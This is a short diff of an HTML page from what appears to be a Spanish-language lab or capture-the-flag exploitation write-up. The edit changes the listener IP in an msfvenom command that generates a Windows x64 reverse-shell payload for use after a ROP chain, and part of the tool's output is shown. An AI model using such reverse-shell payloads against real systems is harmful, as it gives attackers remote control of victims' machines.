@@ -784,7 +784,7 @@ ReaperKeyCheck+0x1becd:
 
 <p class="plain-text">Luego de ejecutar el ropchain solo nos queda crear un shellcode con <code class="language-plaintext highlighter-rouge">msfvenom</code>, en este caso crearemos uno que nos envie una revshell en caso de que se ejecute</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ msfvenom</span><span class="p"> -p windows/x64/shell_reverse_tcp LHOST=10.8.0.10 LPORT=443 -f python -v shellcode  
+<code><span class="ve">❯ msfvenom</span><span class="p"> -p windows/x64/shell_reverse_tcp LHOST=10.8.0.100 LPORT=443 -f python -v shellcode  
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x64 from the payload
 No encoder specified, outputting raw payload
